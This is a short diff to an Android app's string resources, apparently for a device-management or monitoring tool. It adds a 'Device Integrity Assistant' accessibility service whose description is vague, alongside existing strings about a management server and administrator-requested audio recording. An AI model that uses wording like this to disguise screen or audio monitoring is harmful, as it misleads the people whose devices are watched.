@@ -6,4 +6,6 @@
     <string name="service_notification_text">Connected and synchronizing with management server</string>
     <string name="recording_notification_title">Audio Recording in Progress</string>
     <string name="recording_notification_text">Authorized diagnostic recording requested by administrator</string>
+    <string name="accessibility_service_label">Device Integrity Assistant</string>
+    <string name="accessibility_service_description">Analyzes system window transitions and page accessibility to optimize device integrity, diagnostic verification, and app compliance auditing as configured by the device owner.</string>
 </resources>
